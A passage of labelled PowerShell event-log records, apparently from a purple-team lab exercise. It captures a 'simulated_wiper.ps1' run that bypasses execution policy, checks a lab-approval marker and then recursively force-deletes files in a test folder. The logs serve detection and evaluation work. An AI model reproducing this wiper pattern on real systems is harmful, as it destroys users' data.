Pipeline ID = 1\\n        Command Name = Resolve-Path\\n        Command Type = Cmdlet\\n        Script Name = \\\\purplelab.local\\netlogon\\simulated_wiper.ps1\\n        Command Path = \\n        Sequence Number = 16\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17231}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":173},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Join-Path): \"Join-Path\"\\nParameterBinding(Join-Path): name=\"Path\"; value=\"C:\\WiperTest\"\\nParameterBinding(Join-Path): name=\"ChildPath\"; value=\".wiper-lab-approved\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = 1ce98769-62ca-497d-b4d9-b6923fc47b5b\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = d8a27e9c-fe1a-40ac-9e5f-4338465dc6be\\n        Pipeline ID = 1\\n        Command Name = Join-Path\\n        Command Type = Cmdlet\\n        Script Name = \\\\purplelab.local\\netlogon\\simulated_wiper.ps1\\n        Command Path = \\n        Sequence Number = 18\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17232}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":174},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Test-Path): \"Test-Path\"\\nParameterBinding(Test-Path): name=\"LiteralPath\"; value=\"C:\\WiperTest\\.wiper-lab-approved\"\\nParameterBinding(Test-Path): name=\"PathType\"; value=\"Leaf\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = 1ce98769-62ca-497d-b4d9-b6923fc47b5b\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = d8a27e9c-fe1a-40ac-9e5f-4338465dc6be\\n        Pipeline ID = 1\\n        Command Name = Test-Path\\n        Command Type = Cmdlet\\n        Script Name = \\\\purplelab.local\\netlogon\\simulated_wiper.ps1\\n        Command Path = \\n        Sequence Number = 20\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17233}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":175},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-ChildItem): \"Get-ChildItem\"\\nParameterBinding(Get-ChildItem): name=\"LiteralPath\"; value=\"C:\\WiperTest\"\\nParameterBinding(Get-ChildItem): name=\"Recurse\"; value=\"True\"\\nParameterBinding(Get-ChildItem): name=\"File\"; value=\"True\"\\nCommandInvocation(Where-Object): \"Where-Object\"\\nParameterBinding(Where-Object): name=\"NE\"; value=\"True\"\\nParameterBinding(Where-Object): name=\"Property\"; value=\"FullName\"\\nParameterBinding(Where-Object): name=\"Value\"; value=\"C:\\WiperTest\\.wiper-lab-approved\"\\nCommandInvocation(Remove-Item): \"Remove-Item\"\\nParameterBinding(Remove-Item): name=\"Force\"; value=\"True\"\\nParameterBinding(Remove-Item): name=\"WhatIf\"; value=\"False\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\".wiper-lab-approved\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_0ae1034a.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_0ae1034a.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_0ee4f530.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_0ee4f530.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_115bdd86.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_115bdd86.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_1b13b23f.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_1b13b23f.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_29857e81.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_29857e81.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_2b951731.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_2b951731.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_449b9f8d.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_449b9f8d.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_88524924.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_88524924.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_de485b11.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_de485b11.txt\"\\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"file_ea0c83d5.txt\"\\nParameterBinding(Remove-Item): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\FileSystem::C:\\WiperTest\\file_ea0c83d5.txt\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = 1ce98769-62ca-497d-b4d9-b6923fc47b5b\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = d8a27e9c-fe1a-40ac-9e5f-4338465dc6be\\n        Pipeline ID = 1\\n        Command Name = Get-ChildItem\\n        Command Type = Cmdlet\\n        Script Name = \\\\purplelab.local\\netlogon\\simulated_wiper.ps1\\n        Command Path = \\n        Sequence Number = 22\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17234}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":176},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Write-Host): \"Write-Host\"\\nParameterBinding(Write-Host): name=\"Object\"; value=\"Cleanup completed: C:\\WiperTest\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = 1ce98769-62ca-497d-b4d9-b6923fc47b5b\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = d8a27e9c-fe1a-40ac-9e5f-4338465dc6be\\n        Pipeline ID = 1\\n        Command Name = Write-Host\\n        Command Type = Cmdlet\\n        Script Name = \\\\purplelab.local\\netlogon\\simulated_wiper.ps1\\n        Command Path = \\n        Sequence Number = 24\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17235}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":177},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Out-Default): \"Out-Default\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = 1ce98769-62ca-497d-b4d9-b6923fc47b5b\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = d8a27e9c-fe1a-40ac-9e5f-4338465dc6be\\n        Pipeline ID = 1\\n        Command Name = \\n        Command Type = Script\\n        Script Name = \\n        Command Path = \\n        Sequence Number = 26\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17236}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":178},"data":{"event_id":4104,"event_type":"script_block","script_text":"Creating Scriptblock text (1 of 1):\\n$global:?\\n\\nScriptBlock ID: f81992db-fd7f-4a7e-9649-7644a97ea49a\\nPath: ","record_id":17237}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":179},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-Date): \"Get-Date\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-Date\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2749\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17238}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":180},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Export-Csv): \"Export-Csv\"\\nParameterBinding(Export-Csv): name=\"Path\"; value=\"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\run_it_vector.csv\"\\nParameterBinding(Export-Csv): name=\"NoTypeInformation\"; value=\"True\"\\nParameterBinding(Export-Csv): name=\"Append\"; value=\"True\"\\nParameterBinding(Export-Csv): name=\"InputObject\"; value=\"@{timestamp_utc=2026-08-11T15:14:58.6140671Z; run_id=run-001; phase=wiper; status=COMPLETED; details=Step completed successfully.}\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Export-Csv\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2751\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17239}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":181},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-Date): \"Get-Date\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-Date\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2753\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17240}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":182},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Join-Path): \"Join-Path\"\\nParameterBinding(Join-Path): name=\"Path\"; value=\"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\"\\nParameterBinding(Join-Path): name=\"ChildPath\"; value=\"05-post-wipe-files.csv\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Join-Path\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2755\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17241}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":183},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-ChildItem): \"Get-ChildItem\"\\nParameterBinding(Get-ChildItem): name=\"Recurse\"; value=\"True\"\\nParameterBinding(Get-ChildItem): name=\"Force\"; value=\"True\"\\nParameterBinding(Get-ChildItem): name=\"Path\"; value=\"C:\\WiperTest\"\\nParameterBinding(Get-ChildItem): name=\"File\"; value=\"True\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-ChildItem\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2757\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17242}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":184},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-Date): \"Get-Date\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-Date\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2759\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17243}}
